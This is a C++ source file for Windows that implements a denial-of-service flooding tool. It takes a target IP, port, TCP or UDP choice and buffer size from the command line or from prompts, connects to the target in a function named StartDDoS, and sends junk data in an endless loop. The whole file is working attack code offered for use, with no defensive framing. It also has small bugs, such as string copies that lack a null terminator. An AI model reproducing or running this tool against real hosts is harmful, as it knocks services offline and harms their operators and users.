#pragma once
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include<iostream>
#include<string>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>

#pragma comment(lib, "Ws2_32.lib")

struct PREPARED_DATA
{
    const char* ip;
    const char* port;
    uint32_t sock; // SOCK_STREAM || SOCK_DGRAM
    uint32_t protocol; // IPPROTO_TCP || IPPROTO_UDP
    uint32_t buff_size;
};

void StartDDoS(PREPARED_DATA data)
{
    WSADATA wsaData;
    int iResult;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);

    if (iResult)
    {
        printf("Something went wrong... Aborting\n");
        return;
    }

    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = data.sock;
    hints.ai_protocol = data.protocol;

    iResult = getaddrinfo(data.ip, data.port, &hints, &result);
    if (iResult)
    {
        printf("Invalid [ip,port,hints,result] params\n");
        return;
    }

    SOCKET ConnectSocket = INVALID_SOCKET;

    ptr = result;

    // Create a SOCKET for connecting to server
    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
        ptr->ai_protocol);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Error at socket(): %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return;
    }

    iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to ip!\n");
        WSACleanup();
        return;
    }

    printf("Attack started!\n");
    std::string generated_buff(data.buff_size,'0');

    while (true)
        send(ConnectSocket, generated_buff.c_str(), generated_buff.size(), SO_DONTLINGER);
}

std::string ReadSmth(const char* message)
{
    std::string inputed;
    std::cout << message << ": ";
    std::getline(std::cin, inputed);

    return inputed;
}

uint32_t SelectSock(std::string str)
{
    if (str == "STREAM")
        return SOCK_STREAM;
    if (str == "DIAGRAM")
        return SOCK_DGRAM;
    return SOCK_DGRAM;
}

uint32_t SelectProtocol(std::string str)
{
    if (str == "TCP")
        return IPPROTO_TCP;
    if (str == "UDP")
        return IPPROTO_UDP;
    return IPPROTO_UDP;
}

bool GetArgData(int argc, const char** argv, PREPARED_DATA& data)
{
    if (argc != 6)
        return false;

    data.ip = argv[1];
    data.port = argv[2];
    std::string pp = argv[3];
    data.sock = SelectSock(pp);
    pp = argv[4];
    data.protocol = SelectProtocol(pp);
    data.buff_size = std::atoi(argv[5]);

    return true;
}

const char* CopyStr(std::string str)
{
    char* planned_str = new char[str.size()];
    std::copy_n(str.c_str(), str.size(), planned_str);

    return planned_str;
}

int main(int argc, const char** argv)
{
    PREPARED_DATA data;
    if (!GetArgData(argc, argv, data))
    {
        data.ip = CopyStr(ReadSmth("IP"));
        data.port = CopyStr(ReadSmth("PORT"));
        data.sock = SelectSock(ReadSmth("SOCKET (STREAM || DIAGRAM)"));
        data.protocol = SelectProtocol(ReadSmth("PROTOCOL (TCP || UDP)"));
        data.buff_size = std::atoi(ReadSmth("BUFF_SIZE (Bytes)").c_str());
    }
    std::cout << data.ip << std::endl;
    printf("Starting with params:\nIP: %s\nPORT: %s\nSOCK: %d\nPROTOCOL: %d\nBUFF_SIZE (Bytes): %d\n",
        data.ip,data.port,data.sock,data.protocol,data.buff_size);

    StartDDoS(data);
}